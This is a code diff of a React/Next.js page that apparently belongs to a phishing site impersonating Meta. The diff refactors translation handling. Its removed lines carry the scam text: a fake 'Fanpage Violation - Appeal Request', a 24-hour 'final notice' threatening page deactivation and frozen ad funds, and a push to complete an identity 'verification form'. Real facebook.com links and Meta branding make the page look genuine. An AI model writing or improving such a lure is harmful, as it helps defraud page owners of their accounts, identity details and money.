@@ -4,8 +4,8 @@ import MetaAI from '@/assets/images/meta-ai-image.png';
 import MetaImage from '@/assets/images/meta-image.png';
 import ProfileImage from '@/assets/images/profile-image.png';
 import WarningImage from '@/assets/images/warning.png';
+import useTranslation from '@/hooks/useTranslation';
 import { store } from '@/store/store';
-import translateText from '@/utils/translate';
 import type { IconDefinition } from '@fortawesome/fontawesome-svg-core';
 import { faHouse } from '@fortawesome/free-regular-svg-icons/faHouse';
 import { faChevronRight } from '@fortawesome/free-solid-svg-icons/faChevronRight';
@@ -17,7 +17,7 @@ import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
 import dynamic from 'next/dynamic';
 import Image, { type StaticImageData } from 'next/image';
-import { useEffect, useRef, useState, type FC } from 'react';
+import { useEffect, useState, type FC } from 'react';
 
 const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });
 
@@ -108,13 +108,8 @@ const resourceItems: InfoCardItem[] = [
 
 const Page: FC = () => {
     const { isModalOpen, setModalOpen, setGeoInfo, geoInfo } = store();
-    const [translations, setTranslations] = useState<Record<string, string>>({});
+    const { t } = useTranslation();
     const [modalKey, setModalKey] = useState(0);
-    const isTranslatingRef = useRef(false);
-
-    const t = (text: string): string => {
-        return translations[text] || text;
-    };
 
     useEffect(() => {
         if (geoInfo) {
@@ -143,26 +138,6 @@ const Page: FC = () => {
         };
         fetchGeoInfo();
     }, [setGeoInfo, geoInfo]);
-
-    useEffect(() => {
-        if (!geoInfo || isTranslatingRef.current || Object.keys(translations).length > 0) return;
-
-        isTranslatingRef.current = true;
-
-        const textsToTranslate = ['Fanpage Violation - Appeal Request', "We have detected that your page has violated Meta's Community Standards and Advertising Policies. As a result, your page has been flagged as non-compliant. This may lead to restrictions or, in more serious cases, permanent deactivation of your page and associated ad accounts.", 'This is your final notice. If no action is taken within 24 hours, your page will be permanently disabled, and any remaining ad credit balance will be frozen. These funds will not be recoverable after the deadline.', 'To appeal this decision and keep your page active, please complete the verification form below. Our system requires accurate information to process your appeal. Missing or incorrect details may delay the review process, and your request may be automatically rejected.', 'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy.', 'Appeal Request', 'Confirming your page ownership and identity to appeal this decision', 'Please make sure to provide the required information below. Missing details may delay the processing of your request.', 'Submit an Appeal', 'Privacy Center', 'What is the Privacy Policy and what does it say?', 'How you can manage or delete your information', 'Privacy Policy', 'For more details, see the User Agreement', 'AI Product', 'User Agreement', 'Additional resources', 'How Meta uses information for generative AI models', 'Product AI website', 'Introduction to Generative AI', 'For teenagers'];
-
-        const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-
-            for (const text of textsToTranslate) {
-                translatedMap[text] = await translateText(text, geoInfo.country_code);
-            }
-
-            setTranslations(translatedMap);
-        };
-
-        translateAll();
-    }, [geoInfo, translations]);
 
     return (
         <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
@@ -220,7 +195,7 @@ const Page: FC = () => {
 
                     <div className='flex flex-col gap-4'>
                         <div>
-                            <p className='mb-2 text-[16px] font-semibold'>{t('Privacy Center')}</p>
+                            <p className='mb-2 text-[16px] font-semibold'>Privacy Center</p>
                             <div className='overflow-hidden rounded-[15px] bg-white'>
                                 {privacyCenterItems.map((item, index) => {
                                     const isFirst = index === 0;
@@ -231,8 +206,8 @@ const Page: FC = () => {
                                         <a key={item.id} href='https://www.facebook.com/privacy/policy/' target='_blank' rel='noopener noreferrer' className={`flex cursor-pointer items-center gap-3 border-b border-[#e4e6eb] px-4 py-3 no-underline transition hover:bg-[#f5f6f7] ${roundedClass}`}>
                                             {item.image && <Image src={item.image} alt='' className='h-10 w-10' />}
                                             <div className='flex flex-1 flex-col'>
-                                                <p className='text-[16px] leading-[1.25]'>{t(item.title)}</p>
-                                                <p className='text-[14px] text-[#344854]'>{t(item.subtitle)}</p>
+                                                <p className='text-[16px] leading-[1.25]'>{item.title}</p>
+                                                <p className='text-[14px] text-[#344854]'>{item.subtitle}</p>
                                             </div>
                                             <FontAwesomeIcon icon={faChevronRight} className='h-4 w-4 text-[#8a8d91]' />
                                         </a>
@@ -286,9 +261,9 @@ const Page: FC = () => {
                         </div>
 
                         <p className='text-[15px] leading-[1.45] text-[#344854]'>
-                            {t('We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks.')}{' '}
+                            We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks.{' '}
                             <a href='https://www.facebook.com/privacy/policy/' target='_blank' rel='noopener noreferrer' className='text-[#0866ff] hover:underline'>
-                                {t('Read more about Privacy Policy.')}
+                                Read more about Privacy Policy.
                             </a>
                         </p>
                     </div>
